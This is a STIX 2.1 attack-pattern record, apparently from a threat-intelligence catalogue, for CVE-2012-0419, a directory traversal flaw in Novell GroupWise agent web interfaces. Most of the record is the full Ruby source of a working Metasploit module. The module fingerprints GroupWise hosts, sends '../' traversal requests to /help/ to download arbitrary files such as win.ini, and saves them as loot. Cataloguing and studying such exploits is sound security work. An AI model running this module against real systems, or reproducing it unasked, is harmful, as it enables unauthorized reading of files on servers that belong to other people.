{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--868a1c76-01e3-4681-b71f-3389d66992e7",
    "created": "2024-08-14T16:29:14.660403Z",
    "modified": "2024-08-14T16:29:14.660407Z",
    "name": "Novell Groupwise Agents HTTP Directory Traversal",
    "description": " This module exploits a directory traversal vulnerability in Novell Groupwise. The vulnerability exists in the web interface of both the Post Office and the MTA agents. This module has been tested successfully on Novell Groupwise 8.02 HP2 over Windows 2003 SP2.  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/auxiliary/scanner/http/groupwise_agents_http_traversal.rb",
            "external_id": "groupwise_agents_http_traversal.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2012-0419"
        },
        {
            "source_name": "reference",
            "url": "https://support.microfocus.com/kb/doc.php?id=7010772"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Auxiliary\n  include Msf::Exploit::Remote::HttpClient\n  include Msf::Auxiliary::Report\n  include Msf::Auxiliary::Scanner\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'Novell Groupwise Agents HTTP Directory Traversal',\n      'Description'    => %q{\n          This module exploits a directory traversal vulnerability in Novell Groupwise.\n        The vulnerability exists in the web interface of both the Post Office and the\n        MTA agents. This module has been tested successfully on Novell Groupwise 8.02 HP2\n        over Windows 2003 SP2.\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'r () b13$', # Vulnerability discovery\n          'juan vazquez' # Metasploit module\n        ],\n      'References'     =>\n        [\n          [ 'CVE', '2012-0419' ],\n          [ 'OSVDB', '85801' ],\n          [ 'BID', '55648' ],\n          [ 'URL', 'https://support.microfocus.com/kb/doc.php?id=7010772' ]\n        ]\n    ))\n\n    register_options(\n      [\n        Opt::RPORT(7181), # Also 7180 can be used\n        OptString.new('FILEPATH', [true, 'The name of the file to download', '/windows\\\\win.ini']),\n        OptInt.new('DEPTH', [true, 'Traversal depth if absolute is set to false', 10])\n      ])\n  end\n\n  def is_groupwise?\n    res = send_request_raw({'uri'=>'/'})\n    if res and res.headers['Server'].to_s =~ /GroupWise/\n      return true\n    else\n      return false\n    end\n  end\n\n  def run_host(ip)\n\n    if not is_groupwise?\n      vprint_error(\"#{rhost}:#{rport} - This isn't a GroupWise Agent HTTP Interface\")\n      return\n    end\n\n    travs = \"\"\n    travs << \"../\" * datastore['DEPTH']\n\n    travs = normalize_uri(\"/help/\", travs, datastore['FILEPATH'])\n\n    vprint_status(\"#{rhost}:#{rport} - Sending request...\")\n    res = send_request_cgi({\n      'uri'          => travs,\n      'method'       => 'GET',\n    })\n\n    if res and res.code == 200\n      contents = res.body\n      fname = File.basename(datastore['FILEPATH'])\n      path = store_loot(\n        'novell.groupwise',\n        'application/octet-stream',\n        ip,\n        contents,\n        fname\n      )\n      print_good(\"#{rhost}:#{rport} - File saved in: #{path}\")\n    else\n      vprint_error(\"#{rhost}:#{rport} - Failed to retrieve file\")\n      return\n    end\n  end\nend\n"
}